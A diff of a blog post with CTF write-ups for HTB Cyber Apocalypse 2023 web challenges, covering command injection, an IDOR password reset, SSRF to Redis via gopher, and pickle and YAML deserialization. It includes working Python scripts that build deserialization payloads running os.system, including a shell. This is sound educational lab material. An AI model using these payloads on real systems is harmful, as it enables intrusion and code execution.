@@ -76,6 +76,107 @@ We were able to reach 29th place and solve 60/74 challenges. Particularly for we
 
 In this blog post, I will focus specifically on the web challenges in the Cyber Apocalypse 2023 competition. I will provide a detailed analysis of each challenge, along with my thought process and the techniques I used to solve them. Whether you're an aspiring cybersecurity professional or a seasoned veteran, I hope you find my write-ups informative and helpful!
 
+## Gunhead (very easy)
+### Challenge
+**Given file:**: [Get it here](https://github.com/hdthinh1012/htb-cyber-apocalypse-2023/blob/main/web_gunhead.zip)
+
+**Description**: During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.
+
+### Solution
+Click the URL of the generated challenge server, we are greeted with the home page of the challenge - a pseudo management system page
+
+<img src="gunhead-1.png" alt="Home page"/>
+
+There are 3 buttons on the right side of the info panel, we interest in the third one, which gives us the shell UI.
+
+<img src="gunhead-2.png" alt="Button3">
+
+Type /help as instructed, the shell command returns the list of possible commands. We saw the ping command, which is familiar one for command injection challenges.
+
+<img src="gunhead-3.png" alt="/help command">
+
+Open the website in Burp Suite monitored browsers, open the shell and type in the command `/ping 127.0.0.1`, and we see in Burp Suite HTTP history has a POST request to /api/ping
+
+<img src="gunhead-4.png" alt="/ping command">
+
+<img src="gunhead-5.png" alt="burp suite history">
+
+Turn to the challenge source code, at index.php, the /api/ping route is handled the method `ping` of class `ReconController` 
+
+<img src="gunhead-6.png" alt="index.php">
+
+`ReconController.ping()` will create instance of `ReconModel` and its `getOutput()` method, which will pass the user-controlled ip parameters to the ping command but without any command injection filters, means this is an easy command injection chals
+
+<img src="gunhead-7.png" alt="ReconController.php">
+
+<img src="gunhead-8.png" alt="ReconModel.php">
+
+Escape the ping command with the command separator `;`, cat the flag, which is stored at /flag.txt in docker container 
+
+<img src="gunhead-9.png" alt="Dockerfile">
+
+<img src="gunhead-10.png" alt="Flag">
+
+## Passman (easy)
+### Challenge
+**Given file:** [Get it here](https://github.com/hdthinh1012/htb-cyber-apocalypse-2023/blob/main/web_passman.zip)
+
+**Description**: Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?
+
+### Solution
+The challenge starts with a login screen.
+
+<img src="passman-1.png" alt="Login screen">
+
+Looking at `entrypoint.sh` in sources, it appears that an admin account is existed, but the password was random generated so we may have to find someway to get access to admin account later on to finish the challnege.
+
+<img src="passman-2.png" alt="entrypoint.sh">
+
+First create normal account then login. After login success, we are greeted with the dashboard home
+
+<img src="passman-3.png" alt="entrypoint.sh">
+
+<img src="passman-4.png" alt="/dashboard">
+
+Click on the plus button, a form to store credential for online website appears. Fill and submit the form, a new item was created.
+
+<img src="passman-5.png" alt="create form">
+
+<img src="passman-6.png" alt="/dashboard again">
+
+Switch to Burp Suite HTTP History panels to look for intersting requests.
+
+It seems that the website uses single `POST /graphql` endpoint with the JSON body contain `query` field to dictate the server response.
+
+<img src="passman-7.png" alt="/graphql mutation">
+
+<img src="passman-8.png" alt="/getPhraseList ">
+
+It's time to get back to the source for more clues. Here the `/graphql` endpoint will be handled by a `GraphQlSchema` defined in `helpers/GraphqlHelper.js`
+
+<img src="passman-9.png" alt="router">
+<img src="passman-10.png" alt="GraphQLSchema">
+
+In the `GraphQLObjectType` object `mutationType`, there is an interesting field `UpdatePassword`
+
+<img src="passman-11.png" alt="UpdatePassword">
+
+The `UpdatePassword` graphql handler receive `username` and `password`, it just checks whether the user is authenticated then just ouright runs the update password to any usernames it receives without checking whether the current user is the same as user that is gonna haved his/her password changes, some resource authorization problems here.
+
+Open BurpSuite, send the request `POST /graphql` to repeater, edit the JSON body to use UpdatePassword graphql handler. 
+
+<img src="passman-12.png" alt="Burp Suite">
+
+The admin password is updated successfully. Now login as admin.
+
+<img src="passman-13.png" alt="Admin login">
+
+Login successfully, retrieving flag.
+
+<img src="passman-14.png" alt="Admin login">
+
+The flag contents said it was IDOR vulnerabilities, which is actually a incorrect authorization related problem.
+
 ## Orbital (easy)
 ### Challenge
 **Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_orbital.zip)
@@ -729,7 +830,7 @@ There is CSP rule set that only allows source from `self`. What we were trying i
 
 Don't worry, I said 2 things come to my mind while reading the template. The second thing is that the audio use our uploaded `WAV` file. There is a good [writeup](https://dttw.tech/posts/r1jswRaAG) in the past that can clear your mind out. This challenge is more simple. It only checks the header, not the entire file. So we can use hexedit to edit the header of the file to `WAV` header and include our xss payload. You can either use hexedit on your laptop or like me use an online hexeditor.
 
-But does it used `<audio>` tag, how can the script be executed ? You're right, we can't. However if something like `<script src="our-evil-media-file.wav"></script>` appears, it will execute our payload like a charm. Well how can we make it appear ?
+But doesn't it use `<audio>` tag, how can the script be executed ? You're right, we can't. However if something like `<script src="our-evil-media-file.wav"></script>` appears, it will execute our payload like a charm. Well how can we make it appear ?
 Use `!{hostname}` obviously.
 
 <img src="spybug2.png" alt="Hex edit">
@@ -767,4 +868,385 @@ Repeat all the steps above against challenge server. We will see the flag in the
 
 Flag: `HTB{p01yg10t5_4nd_35p10n4g3}`
 
-## TrapTrack (hard) (coming soon)
+## TrapTrack (hard)
+### Challenge
+**Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_traptrack.zip)
+
+**Description**: The aliens have prepared several trap websites to spread their propaganda campaigns on the internet. Our intergalactic forensics team has recovered an artifact of their health check portal that keeps track of their trap websites. Can you take a look and see if you can infiltrate their system?
+
+### Solution
+Right ... Another login panel, excepts, now the credential is harcoded in to the source code ε-(´・｀) ﾌ
+
+<img src="traptrack1.png" alt="creds">
+
+<img src="traptrack2.png" alt="creds">
+
+Use that cred and login to panel. Here at the panel, we see some kind of URL health checking going on.
+
+<img src="traptrack3.png" alt="creds">
+
+Let's try to put some URL in. How about our little RequestBin.
+
+<img src="traptrack4.png" alt="creds">
+
+Result:
+
+<img src="traptrack5.png" alt="creds">
+
+Very noice. So it really does somewhat of a CURL thing. Let's look at the source code and this time I'll ask ChatGPT what the challenge does.
+
+**`blueprints/routes.py`**
+``` python
+import json
+from application.database import db, User, TrapTracks
+from flask import Blueprint, Response, jsonify, redirect, render_template, request
+from flask_login import login_required, login_user, logout_user
+from application.cache import get_job_list, create_job_queue, get_job_queue
+
+web = Blueprint('web', __name__)
+api = Blueprint('api', __name__)
+
+def response(message, status=200):
+    return jsonify({'message': message}), status
+
+@web.route('/', methods=['GET'])
+def login():
+    return render_template('login.html')
+
+@api.route('/login', methods=['POST'])
+def user_login():
+    if not request.is_json:
+        return response('Missing required parameters!', 401)
+
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+
+    if not username or not password:
+        return response('Missing required parameters!', 401)
+
+    user = User.query.filter_by(username=username).first()
+
+    if not user or not user.password == password:
+        return response('Invalid username or password!', 403)
+
+    login_user(user)
+    return response('User authenticated successfully!')
+
+@web.route('/admin/')
+@login_required
+def scrape_list():
+    trap_tracks = TrapTracks.query.all()
+    return render_template('admin.html', tracks=trap_tracks)
+
+@api.route('/tracks/list', methods=['GET'])
+@login_required
+def job_list():
+    data = get_job_list()
+
+    if not data:
+        return Response(json.dumps([]), mimetype='application/json')
+
+    return Response(json.dumps(data), mimetype='application/json')
+
+@api.route('/tracks/add', methods=['POST'])
+@login_required
+def tracks_add():
+    if not request.is_json:
+        return response('Missing required parameters!', 401)
+
+    data = request.get_json()
+
+    trapName = data.get('trapName', '')
+    trapURL = data.get('trapURL', '')
+
+    if not trapName or not trapURL:
+        return response('Missing required parameters!', 401)
+
+    async_job = create_job_queue(trapName, trapURL)
+
+    track = TrapTracks(trap_name=trapName, trap_url=trapURL, track_cron_id=async_job['job_id'])
+
+    db.session.add(track)
+    db.session.commit()
+
+    return response('Trap Track added successfully!', 200)
+
+@api.route('/tracks/delete', methods=['POST'])
+@login_required
+def tracks_del():
+    if not request.is_json:
+        return response('Missing required parameters!', 401)
+
+    data = request.get_json()
+
+    trackID = data.get('id', '')
+
+    if not trackID:
+        return response('Missing required parameters!', 401)
+
+    try:
+        TrapTracks.query.filter_by(id=int(trackID)).delete()
+        db.session.commit()
+    except Exception as e:
+        pass
+
+    return response('Trap Track deleted successfully!', 200)
+
+
+@api.route('/tracks/<int:job_id>/status', methods=['GET'])
+@login_required
+def job_status(job_id):
+    data = get_job_queue(job_id)
+
+    if not data:
+        return response('Job does not exist!', 401)
+
+    return Response(json.dumps(data), mimetype='application/json')
+
+@web.route('/logout')
+@login_required
+def logout():
+    logout_user()
+    return redirect('/')
+```
+
+> This code is a Flask web application that has two blueprints (web and api) and uses a database to store and manage User and TrapTracks models.
+>
+> The web blueprint defines three routes:
+>
+>  1. '/' that renders a login template.
+>  2. '/admin/' that requires login and renders an admin template with all TrapTracks.
+>  3. '/logout' that requires login and logs out the user.
+> 
+> The api blueprint defines four routes:
+> 1. '/login' that receives a POST request with a JSON payload containing a username and password field, authenticates the user, and returns a response with a message.
+> 2. '/tracks/list' that requires login and returns a response with all the TrapTracks.
+> 3. '/tracks/add' that requires login and receives a POST request with a JSON payload containing a trapName and a trapURL field, adds a new TrapTrack to the database, and returns a response with a message.
+> 4. '/tracks/delete' that requires login and receives a POST request with a JSON payload containing an id field that corresponds to a TrapTrack to be deleted from the database.
+> The response function is a helper function that returns a JSON response with a message and an optional status.
+> The code uses Flask-Login to manage user authentication and Flask-Caching to cache job data.
+> --ChatGPT--
+
+Hmmm, pretty neat, so it does keep records of all the tracks or we might say all the jobs. Let's look deeper into how the jobs are created and executed.
+
+```python
+from flask import current_app
+import pickle, base64
+
+def env(key):
+    val = False
+    try:
+        val = current_app.config[key]
+    finally:
+        return val
+
+def get_job_list():
+    data = current_app.redis.hkeys(env('REDIS_JOBS'))
+    data = [job_id.decode() for job_id in data]
+
+    return data
+
+def get_job_id():
+    job_id = current_app.redis.get(env('REDIS_NUM_JOBS'))
+    current_app.redis.incr(env('REDIS_NUM_JOBS'))
+    return job_id
+
+def create_job_queue(trapName, trapURL):
+    job_id = get_job_id()
+
+    data = {
+        'job_id': int(job_id),
+        'trap_name': trapName,
+        'trap_url': trapURL,
+        'completed': 0,
+        'inprogress': 0,
+        'health': 0
+    }
+
+    current_app.redis.hset(env('REDIS_JOBS'), job_id, base64.b64encode(pickle.dumps(data)))
+
+    current_app.redis.rpush(env('REDIS_QUEUE'), job_id)
+
+    return data
+
+def get_job_queue(job_id):
+    data = current_app.redis.hget(env('REDIS_JOBS'), job_id)
+    if data:
+        return pickle.loads(base64.b64decode(data))
+
+    return None
+```
+
+Okay, so it has some function like:
+- Get all jobs' IDs from Redis database
+- Get current incremented ID
+- Queue a job in the database
+- Get the data from of a job with given ID
+
+What truely stand out of all these are these line:
+
+```python
+def get_job_queue(job_id):
+    data = current_app.redis.hget(env('REDIS_JOBS'), job_id)
+    if data:
+        return pickle.loads(base64.b64decode(data)) # My money maker
+
+    return None
+```
+
+The principal is somewhat similar to a misc chall called [`Hijack`](#hijack-easy). This is no doubt a `pickle deserialization` attack which can execute remote code, our code.
+
+Is this the end of the challenge ? Well, ***no***. Let's look up a few lines and see why.
+
+```python
+def create_job_queue(trapName, trapURL):
+    job_id = get_job_id()
+
+    data = {
+        'job_id': int(job_id),
+        'trap_name': trapName,
+        'trap_url': trapURL,
+        'completed': 0,
+        'inprogress': 0,
+        'health': 0
+    }
+
+    current_app.redis.hset(env('REDIS_JOBS'), job_id, base64.b64encode(pickle.dumps(data))) # This line right here
+
+    current_app.redis.rpush(env('REDIS_QUEUE'), job_id)
+
+    return data
+```
+
+The data that should give us way to pass in our malicious class is actually serialized before it can be unserialized. The challenge is not that simple as it looks anymore.
+
+Another features of the app is that health checking thing. It takes a URL and calls to URL regardless of host and protocol. This is perfect as we know Redis also runs on this challenge instance **and** our data is stored on it including those jobs. So if we can somehow manange this feature to change the data of a job to a pickle serialized base64 encoded string of an "evil" object, when this data os loaded, there will be RCE. This can be done with the URL health check features.
+
+So to summarize, we will make use of SSRF vulnerabilities to change the data so it can trigger pickle deserialzation attack.
+
+Good theory, but how can we perform such an attack. There are good resources on this:
+
+https://infosecwriteups.com/exploiting-redis-through-ssrf-attack-be625682461b
+
+https://trevorsaudi.medium.com/ssrf-to-gaining-rce-rootme-ssrf-box-31b7d0e5ad08
+
+There's a tool called `Gopherus` but since this challenge is more simple, I will try to modify a script on a [github repo](https://github.com/rhamaa/Web-Hacking-Lab/blob/master/SSRF_REDIS_LAB/payload_redis.py) to:
+
+```python
+from __future__ import print_function
+
+import os
+import sys
+import base64
+import urllib.parse
+import pickle
+import subprocess
+
+
+def generate_resp(command):
+    res = ""
+
+    if isinstance(command, list):
+        pass
+    else:
+        command = command.split(" ")
+    
+    res += "*{}\n".format(len(command))
+    for cmd in command:
+        res += "${}\n".format(len(cmd))
+        res += "{}\n".format(cmd)
+    
+    return res
+
+def generate_gopher(payload):
+    
+    final_payload = "gopher://127.0.0.1:6379/_{}".format(urllib.parse.quote(payload))
+    return final_payload
+
+class PickleExploit(object):
+    def __init__(self, command):
+        self.cmd = command
+
+    def __reduce__(self):
+        cmd = command
+        return (os.system, (cmd,))
+
+def pickle_payload(key, field, command):
+    res = ""
+
+    payload = pickle.dumps(PickleExploit(command))
+    res += "\r\n"
+    res += generate_resp("hset {} {} {}".format(key, field, base64.b64encode(payload).decode()))
+
+    res = res.replace("\n", "\r\n")
+
+    print(generate_gopher(res))
+
+if sys.argv[1] == "pickle":
+    key = input("Key name > ")
+    field = input("Field name > ")
+    command = input("Command > ")
+    pickle_payload(key, field, command)
+```
+
+This pickle serialized thing works fine on Unix platform. It should also works fine on Windows platform usually, however if you experience any errors on your Windows machine, try to use WSL (Window Subsystem Linux), install Linux on a Virtual Machine or buy a MacBook. 💸💸💸
+
+With that script let's try to finalize our work. We will try to change `hvalue` of `jobs` from `hfield` of 100 (which is the first key:value pair of `jobs`). Why `jobs` ? Because it is the hash key that stores the jobs which contain the serialized object. Why change it ? So we can inject a evil-crafted serialized object of our own so when it is loaded, the command we want to run will be executed.
+
+Overall the technique to solve this challenge is not too flashy, it still requires a lot of knowledge around it. Very nice chall. Hope we all learn something from it.
+
+<img src="traptrack6.png" alt="creds">
+
+<img src="traptrack7.png" alt="creds">
+
+<img src="traptrack8.png" alt="creds">
+
+Flag: `HTB{tr4p_qu3u3d_t0_rc3!}`
+
+## Hijack (easy)
+
+### Challenge
+
+**Description**: The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?
+
+### Solution
+
+Let's try to connect to the challenge instance.
+
+<img src="hijack1.png" alt="Demo"/>
+
+And let's try to test out those options.
+
+<img src="hijack2.png" alt="Demo"/>
+
+`ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNScsIGF1dG9fY2FsaWJyYXRpb246ICdvbicsCiAgcHJvcHVsc2lvbl90ZW1wOiAnMzQzNCcsIHNvbGFyX2FycmF5X3RlbXA6ICcxMicsIHVuaXRzOiBmfQo=`
+
+The function in question generates a base64 encoded string representing a serialized object. To provide some context, serialization is the process of storing an object, such as an array or class, in a database for later retrieval. When the application needs to access the object, it unserializes it, or loads it from the database using a function. This can improve the efficiency of Object-Oriented Programming.
+
+It is important to note, however, that serialized objects should not be vulnerable to manipulation by users. If a user creates a malicious object, it could execute unwanted code. This challenge illustrates this point by presenting us with a serialized object and its corresponding base64 encoding. This is just one example of how serialized objects can be used, and it is essential to be aware of their potential risks.
+
+Let's take a look at the next options. The application is requesting a base64 encoded string of a serialized object.
+
+<img src="hijack3.png" alt="Demo"/>
+
+Upon examining the serialized object provided by the application, I have determined that it is a YAML-formatted Python serialized object. This [article](https://net-square.com/yaml-deserialization-attack-in-python.html) serves as an excellent illustration of how attackers can leverage YAML-based exploits to execute arbitrary code.
+
+Here is the script to generate a serialized object.
+
+```python
+import yaml
+import os
+import base64
+class Test(object):
+  def __reduce__(self):
+    return (os.system, ('sh',))
+serialized_data = yaml.dump(Test()) # serializing data
+print(base64.b64encode(serialized_data.encode()).decode())
+```
+
+Let's grab the result and throw it to the application.
+
+<img src="hijack4.png" alt="Demo"/>
+
+Flag: `HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`
